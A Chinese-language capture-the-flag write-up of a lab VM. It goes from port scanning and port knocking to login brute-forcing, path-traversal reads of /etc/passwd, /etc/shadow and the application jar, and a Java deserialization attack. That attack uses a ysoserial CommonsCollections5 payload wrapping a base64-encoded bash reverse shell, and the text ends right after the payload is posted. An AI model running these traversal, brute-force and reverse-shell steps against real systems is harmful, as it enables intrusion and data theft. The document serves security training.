![image-20250627200158237](https://7r1umphk.github.io/image20250627200158372.webp)

群内靶机

开搞

## 一、信息收集与发现

渗透测试的第一步永远是信息收集。我们首先需要确定目标在网络中的位置。

### 1.1 主机发现

我们处于 `192.168.205.0/24` 网段，使用 `arp-scan` 对整个C段进行扫描，以发现存活的主机。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                      
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.131 08:00:27:0f:fa:c2       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f3:f6:bb       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.038 seconds (125.61 hosts/sec). 4 responded
                 
```

成功发现目标主机IP为 `192.168.205.131`。

### 1.2 端口扫描

确定IP后，使用 `nmap` 对其进行全端口扫描，探测开放的服务。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:02 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00046s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8080/tcp filtered http-proxy
MAC Address: 08:00:27:0F:FA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.23 seconds
                                                    
```

扫描结果显示，SSH（22端口）和HTTP（80端口）服务是开放的，而8080关闭（我本身说来试一下LingMj的压测大法，结果不行），那看80

## 二、端口敲门与服务暴露

访问80端口的Web服务，我们发现一个模拟的Linux终端界面。

![image-20250627200436415](https://7r1umphk.github.io/image20250627200436564.webp)

看到这就有点假了，所以直接看源码吧

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Linux Terminal Simulator</title>
  <style>
    body {
      background-color: #000;
      color: #00ff00;
      font-family: monospace;
      margin: 0;
      padding: 10px;
    }
    #terminal {
      white-space: pre-wrap;
      min-height: 90vh;
      overflow-y: auto;
    }
    .line {
      display: flex;
      flex-wrap: wrap;
    }
    input {
      background: none;
      border: none;
      color: #00ff00;
      font-family: monospace;
      font-size: 1em;
      outline: none;
      flex: 1;
    }
    ::selection {
      background: #008000;
    }
  </style>
</head>
<body>
  <div id="terminal"></div>

  <script>
    const terminal = document.getElementById("terminal");

    const fileSystem = {
      "home": {
        "user": {
          "file1.txt": "Hello, this is file1.",
          "notes.md": "# Notes\nThis is a markdown file."
        }
      },
      "var": {
        "log.txt": "System log content here."
      },
      "opt":{
        "code":{
            "test.c":`#include<stdio.h>
#include<stdlib.h>

int main()
{
        srand(114514);
        for(int i = 0; i < 114514; i++)
        {
                rand();
        }
        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);


        return 0;
}`
        }
      }

    };

    let currentPath = ["home", "user"];
    let history = [];
    let historyIndex = -1;

    function getDir(pathArr, fs) {
      let node = fs;
      for (let part of pathArr) {
        if (node[part] && typeof node[part] === 'object') {
          node = node[part];
        } else {
          return null;
        }
      }
      return node;
    }

    function getPathString() {
      return "/" + currentPath.join("/");
    }

    function renderPrompt() {
      return `user@linux:${getPathString()}$ `;
    }

    function printOutput(prompt, input, output) {
      const block = document.createElement("div");
      block.innerHTML = `
        <div>${prompt}${input}</div>
        <div>${output}</div>
      `;
      terminal.appendChild(block);
    }

    function createInputLine() {
      const line = document.createElement("div");
      line.className = "line";

      const promptSpan = document.createElement("span");
      promptSpan.textContent = renderPrompt();

      const input = document.createElement("input");
      input.type = "text";
      input.autofocus = true;

      line.appendChild(promptSpan);
      line.appendChild(input);
      terminal.appendChild(line);

      input.focus();

      input.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          const value = input.value.trim();
          input.disabled = true;
          runCommand(value);
        } else if (e.key === "ArrowUp") {
          if (historyIndex > 0) {
            historyIndex--;
            input.value = history[historyIndex];
          }
        } else if (e.key === "ArrowDown") {
          if (historyIndex < history.length - 1) {
            historyIndex++;
            input.value = history[historyIndex];
          } else {
            input.value = "";
          }
        }
      });
    }

    function runCommand(input) {
      const prompt = renderPrompt();
      if (input !== "") {
        history.push(input);
        historyIndex = history.length;
      }

      function escapeHTML(str) {
            return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    }

      const args = input.split(" ");
      const cmd = args[0];
      const param = args.slice(1);
      const currentDir = getDir(currentPath, fileSystem);
      let output = "";

      switch (cmd) {
        case "help":
          output = "命令: help, clear, echo, ls, cd, cat, date";
          break;
        case "clear":
          terminal.innerHTML = "";
          createInputLine();
          return;
        case "echo":
          output = param.join(" ");
          break;
        case "date":
          output = new Date().toString();
          break;
        case "ls":
          if (currentDir) {
            output = Object.keys(currentDir).join("  ");
          } else {
            output = "无法访问当前目录";
          }
          break;
        case "cd":
          if (param.length === 0 || param[0] === "~") {
            currentPath = ["home", "user"];
          } else if (param[0] === "..") {
            if (currentPath.length > 0) currentPath.pop();
          } else {
            const target = param[0];
            const newPath = [...currentPath, target];
            const targetDir = getDir(newPath, fileSystem);
            if (targetDir && typeof targetDir === "object") {
              currentPath = newPath;
            } else {
              output = `cd: 没有这个目录: ${target}`;
            }
          }
          break;
        case "cat":
          if (param.length === 0) {
            output = "cat: 需要文件名参数";
          } else {
            const file = param[0];
            if (currentDir[file] && typeof currentDir[file] === "string") {
              output = escapeHTML(currentDir[file]);
            } else {
              output = `cat: 找不到文件 ${file}`;
            }
          }
          break;
        case "":
          output = "";
          break;
        default:
          output = `未找到命令: ${cmd}`;
      }

      printOutput(prompt, input, output);
      createInputLine();
      terminal.scrollTop = terminal.scrollHeight;
    }

    // 初始化
    createInputLine();
    terminal.addEventListener("click", () => {
      const inputs = terminal.querySelectorAll("input");
      if (inputs.length > 0) inputs[inputs.length - 1].focus();
    });
  </script>
</body>
</html>

```

扒拉的时候看到了一个文件/opt/code/test.c，处理一下就下面那样

```
#include<stdio.h>
#include<stdlib.h>

int main()
{
        srand(114514); 
        for(int i = 0; i < 114514; i++)
        {
                rand();
        }
        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);


        return 0;
}
```

假随机数

> **伪随机数**
>
> 计算机生成的随机数通常是伪随机的，它们由一个初始的“种子”（seed）通过特定算法生成。如果种子固定，那么后续生成的“随机”数序列也是完全固定和可预测的。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nano test.c
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat test.c 
#include<stdio.h>
#include<stdlib.h>

int main()
{
        srand(114514); 
        for(int i = 0; i < 114514; i++)
        {
                rand();
        }
        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);


        return 0;
}
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gcc test.c -o test
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ./test     
6440\n17226\n31925\n                                                             
```

看到这三个数大概猜到要干嘛了，敲门

> **端口敲门（Port Knocking）**
>
> 这是一种通过向目标主机预先定义好的一系列端口发送请求（“敲门”），来动态开启某个特定服务端口的安全机制。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ knock 192.168.205.131 6440 17226 31925
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ knock 192.168.205.131 6440 17226 31925
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ knock 192.168.205.131 6440 17226 31925        
```

敲门程序有概率抽风，所以多敲几次

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.131              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:11 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00065s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:0F:FA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds                     
```

8080开了，去看一下

## 三、Web应用渗透：从LFI到RCE

![image-20250627201136754](https://7r1umphk.github.io/image20250627201136940.webp)

### 3.1 弱口令爆破与认证绕过

登录，尝试弱密码

![image-20250627201201451](https://7r1umphk.github.io/image20250627201201647.webp)

登不上，但是看到一个貌似可以注入的地方，看看源码先

```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>用户登录</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(to right, #74ebd5, #ACB6E5);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        .login-container h2 {
            text-align: center;
            margin-bottom: 24px;
            color: #333;
        }

        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
        }

        .login-container input[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }

        .login-container input[type="submit"]:hover {
            background-color: #45a049;
        }

        .message {
            color: red;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
<div class="login-container">
    <h2>登录</h2>
    <form method="post" action="/login">
        <input type="text" name="username" placeholder="用户名" required>
        <input type="password" name="password" placeholder="密码" required>
        <input type="submit" value="登录">
    </form>
    <div class="message">
        <!-- 后端可以通过重定向参数显示失败信息 -->
        <span id="error-message"></span>
    </div>
</div>
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const error = urlParams.get('error');
    if (error) {
        document.getElementById('error-message').innerText = decodeURIComponent(error);
    }
</script>
</body>
</html>

```

假的，本地实现的，不然error可以测试一下{{7*7}}模板注入

爆破一下目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/download                                                                                   
{"timestamp":"2025-06-27T12:14:39.104+0000","status":400,"error":"Bad Request","message":"Required String parameter 'file' is not present","path":"/download"}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../etc/passwd"
<h1>Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=....//....//....//etc/passwd"
<h1>Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=php://filter/read=convert.base64-encode/resource=../../../etc/passwd"
<h1>Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=download"                                                            
<h1>Forbidden access                                                                                                                                             ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
<h1>Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/download?file=..%5c..%5c..%5cetc/passwd"
<h1>Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/download?file=a/../../../../etc/passwd"
<h1>Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/download?file=file:///etc/passwd"
<h1>Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/download?file=../../../../etc/passwd%00.jpg"
<h1>Forbidden access                                                                                                                    
```

应该是少参数，暂时搁置

绕过不了，继续看其他的

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/error                                                                    
{"timestamp":"2025-06-27T12:16:49.948+0000","status":999,"error":"None","message":"No message available"}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/login
{"timestamp":"2025-06-27T12:16:58.321+0000","status":405,"error":"Method Not Allowed","message":"Request method 'GET' not supported","path":"/login"}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/login -X POST
{"timestamp":"2025-06-27T12:17:20.707+0000","status":400,"error":"Bad Request","message":"Required String parameter 'username' is not present","path":"/login"}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/test/        
    \<h1>Website is under development.......                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ trans -b :zh "Website is under development......." 2>/dev/null
网站正在开发中.......
```

gobuster跑一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u http://192.168.205.131:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.131:8080
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 400) [Size: 158]
/login.html           (Status: 200) [Size: 2377]
/login                (Status: 405) [Size: 149]
/test                 (Status: 200) [Size: 39]
/logout               (Status: 302) [Size: 0] [--> http://192.168.205.131:8080/login.html]
/success              (Status: 200) [Size: 47]
/error                (Status: 500) [Size: 105]
```

多了一个logout但是是跳转

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/logout -v                       
*   Trying 192.168.205.131:8080...
* Connected to 192.168.205.131 (192.168.205.131) port 8080
* using HTTP/1.x
> GET /logout HTTP/1.1
> Host: 192.168.205.131:8080
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 
< Set-Cookie: auth=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly
< Location: http://192.168.205.131:8080/login.html
< Content-Length: 0
< Date: Fri, 27 Jun 2025 12:27:05 GMT
< 
* Connection #0 to host 192.168.205.131 left intact
```

nuclei扫描一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://192.168.205.131:8080
Generated code
__     _
Use code with caution.
____  __  / /  ()
/ __ / / / / / / _ / /
/ / / / // / // /  __/ /
// //_,/_/_/_/_/   v3.4.5
Generated code
projectdiscovery.io
Use code with caution.
[INF] Your current nuclei-templates  are outdated. Latest is v10.2.3
[INF] Successfully updated nuclei-templates (v10.2.3) to /home/kali/.local/nuclei-templates. GoodLuck!
Nuclei Templates v10.2.3 Changelog
+-------+-------+----------+---------+
| TOTAL | ADDED | MODIFIED | REMOVED |
+-------+-------+----------+---------+
| 11102 | 11102 |        0 |       0 |
+-------+-------+----------+---------+
[INF] Current nuclei version: v3.4.5 (latest)
[INF] Current nuclei-templates version: v10.2.3 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 105
[INF] Templates loaded for current scan: 8086
[INF] Executing 7884 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 202 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1747 (Reduced 1642 Requests)
[INF] Using Interactsh Server: oast.online
[ssh-auth-methods] [javascript] [info] 192.168.205.131:22 ["["publickey","password","keyboard-interactive"]"]
[ssh-server-enumeration] [javascript] [info] 192.168.205.131:22 ["SSH-2.0-OpenSSH_9.9"]
[ssh-password-auth] [javascript] [info] 192.168.205.131:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.131:22
[spring-detect] [http] [info] http://192.168.205.131:8080/error
[options-method] [http] [info] http://192.168.205.131:8080 ["GET,HEAD,OPTIONS"]
[springboot-actuator:favicon] [http] [info] http://192.168.205.131:8080/favicon.ico
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.131:8080/login.html
[favicon-detect:spring-boot] [http] [info] http://192.168.205.131:8080/favicon.ico ["116323821"]
[favicon-detect:Springboot Actuators] [http] [info] http://192.168.205.131:8080/favicon.ico ["116323821"]
[favicon-detect:Spring Boot H2 Database] [http] [info] http://192.168.205.131:8080/favicon.ico ["116323821"]
[INF] Scan completed in 1m. 21 matches found.
```

看到Spring Boot，所以尝试探测了一下，无果

那去爆破login吧

乱输，burp拦上，放去爆破模块

![image-20250627203233278](https://7r1umphk.github.io/image20250627203233435.webp)

用户名

密码扒拉一个rockyou

![image-20250627203358528](https://7r1umphk.github.io/image20250627203358895.webp

登录

![image-20250627203459351](https://7r1umphk.github.io/image20250627203459633.webp)

源码没啥，那就看一下包

```
GET /success HTTP/1.1
Host: 192.168.205.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.205.131:8080/login.html?error=Wrong%20username%20or%20password
Connection: keep-alive
Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

有个cookie，我们刚刚那里也少个参数so

### 3.2 任意文件读取（LFI）

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../etc/passwd" -H "Cookie:auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI="
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

可以任意文件读取，但是发现好像没几个用户

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../etc/shadow" -H "Cookie:auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI="
root:!::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
postgres:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
                                    
```

看到这就有点怀疑是docker了

因为前面nuclei扫描的时候看到可能是springboot，所以关注一下Java

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../../proc/self/cmdline" -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=" -o cmdline
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    40    0    40    0     0   8188      0 --:--:-- --:--:-- --:--:-- 10000
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat cmdline                                                                 
java-jarjavaserver-0.0.1-SNAPSHOT.jar                                           
```

假设路径是app/java-jarjavaserver-0.0.1-SNAPSHOT.jar

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../../app/java-jarjavaserver-0.0.1-SNAPSHOT.jar" -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI="
../../../../app/java-jarjavaserver-0.0.1-SNAPSHOT.jar                          
```

啊这，那我不猜了

Linux 的 /proc 文件，可以查看**当前工作目录**

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../../proc/self/cwd" -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI="
../../../../proc/self/cwd                                                       
```

啊这，那继续猜吧

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=javaserver-0.0.1-SNAPSHOT.jar" -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=" -o app.jar && ls -l app.jar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16.5M    0 16.5M    0     0  12.9M      0 --:--:--  0:00:01 --:--:-- 12.9M
-rwxr-xr-x 1 kali kali 17372545  6月27日 08:51 app.jar
                                                       
```

（要不去买个彩票，哈哈哈）

### 3.3 Java反序列化漏洞利用

拿jd-gui看看

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ jd-gui app.jar

```

![image-20250627205341588](https://7r1umphk.github.io/image20250627205341941.webp)

没东西，但是**VulnController.class**

```
// ...
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
// ...

@PostMapping({"/deserialize"})
public String deserialize(@RequestBody byte[] data, HttpServletRequest request) {
    if (!isLoggedIn(request)) // 检查是否已登录
        return "<h2>Error: Unauthorized access";
    try {
        // 危险操作：直接从请求体中读取数据并反序列化
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        Object obj = ois.readObject();
        ois.close();
        return "Deserialized: " + obj.toString();
    } catch (Exception e) {
        return "Error: " + e.getMessage();
    }
}
```

看他的处理方法......有点像打**反序列化**

> Java反序列化漏洞
>
> 应用接收了来自用户的序列化数据，并在没有进行安全检查的情况下调用 `ObjectInputStream.readObject()` 将其还原为Java对象。如果应用的classpath中存在某些被称为“gadget”的特殊类，攻击者就可以构造恶意的序列化数据。当这些数据被反序列化时，会触发gadget类中的方法，最终导致任意代码执行（RCE）。

![image-20250627205623427](https://7r1umphk.github.io/image20250627205623599.webp)

ok，没事了，就是打反序列化

commons-collections-3.2.1.jar这个库，如果了解的话，就知道可以被 ysoserial 工具利用

url:/deserialize

请求方法：POST

if (!isLoggedIn(request)) 必须携带有效的 Cookie

new ObjectInputStream(new ByteArrayInputStream(data));和 ois.readObject();打开房门让你进，不做任何检查，非常的教科书

那拿一下吧

Kali监听一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

使用 ysoserial生成反弹 Shell payload

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar 
--2025-06-27 20:21:29--  https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
正在解析主机 github.com (github.com)... 224.0.0.1
正在连接 github.com (github.com)|224.0.0.1|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 302 Found
位置：https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar [跟随至新的 URL]
--2025-06-27 20:21:32--  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
再次使用存在的到 github.com:443 的连接。
已发出 HTTP 请求，正在等待回应... 302 Found
位置：https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250628%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250628T002132Z&X-Amz-Expires=1800&X-Amz-Signature=6f7e3edd576cb88052588bac5ba19eef49326f73e6dbe5802b878c1f9e6ec3f3&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&response-content-type=application%2Foctet-stream [跟随至新的 URL]
--2025-06-27 20:21:32--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250628%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250628T002132Z&X-Amz-Expires=1800&X-Amz-Signature=6f7e3edd576cb88052588bac5ba19eef49326f73e6dbe5802b878c1f9e6ec3f3&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&response-content-type=application%2Foctet-stream
正在解析主机 objects.githubusercontent.com (objects.githubusercontent.com)... 224.0.0.2
正在连接 objects.githubusercontent.com (objects.githubusercontent.com)|224.0.0.2|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：59525376 (57M) [application/octet-stream]
正在保存至: “ysoserial-all.jar”

ysoserial-all.jar                            100%[============================================================================================>]  56.77M  17.2MB/s  用时 3.9s    

2025-06-27 20:21:39 (14.6 MB/s) - 已保存 “ysoserial-all.jar” [59525376/59525376])

                                                               
```

生成 payload（可能你的java会有问题，去下载一个Java 8版本的就好了）

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo -n 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvODg4OCAwPiYx
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" > payload.bin
```

尝试

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/deserialize" -X POST --cookie "auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=" --data-binary @payload.bin                   
